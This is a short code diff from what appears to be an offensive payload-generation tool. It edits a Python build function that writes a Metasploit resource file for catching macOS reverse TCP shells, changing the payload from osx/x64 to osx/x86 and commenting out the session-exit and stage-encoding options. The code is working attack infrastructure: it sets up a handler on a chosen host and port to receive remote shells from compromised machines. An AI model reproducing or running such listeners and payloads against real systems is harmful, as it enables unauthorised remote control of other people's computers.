@@ -177,10 +177,10 @@ def build(lhost,lport):
 #====================================================
   listenerFileName="{0}/{1}".format(listenerPath,"975-MacShellReverseTCP.rc")
   options = "use multi/handler\n"
-  options += "set payload osx/x64/shell_reverse_tcp\n"
+  options += "set payload osx/x86/shell_reverse_tcp\n"
   options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
-  options += "set ExitOnSession false\n"
-  options += "set EnableStageEncoding true\n"
+  #options += "set ExitOnSession false\n"
+  #options += "set EnableStageEncoding true\n"
   options += "exploit -j\n"
   if not os.path.exists(os.path.dirname(listenerFileName)):
     try:
